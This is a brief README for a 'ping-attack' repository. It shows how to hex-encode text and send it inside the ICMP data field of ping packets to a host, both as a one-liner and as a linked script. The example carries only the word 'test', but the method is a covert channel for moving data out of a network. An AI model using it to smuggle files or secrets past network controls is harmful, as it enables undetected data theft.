# ping-attack

Basic Commands:<br>

#This will take the text "test" and convert to hex:<br>
```bash
echo "test" | xxd -p```

#output:<br>
746573740a

#This will ping the ip address and add the hex of "test" into the data field<br>
```ping -c 1 192.168.1.5 -p 746573740a```


or use the oneline script of:<br>
```ping -c 1 192.168.1.5 -p $(echo -n "test" | xxd -p)```

or use the scripts ping_payload1.sh located at:<br>
https://github.com/yen5004/ping-attack/blob/9aae89150817556d350d8b5587fc3f86cccddde3/ping_payload1.sh<br>
just pass the ip address and text
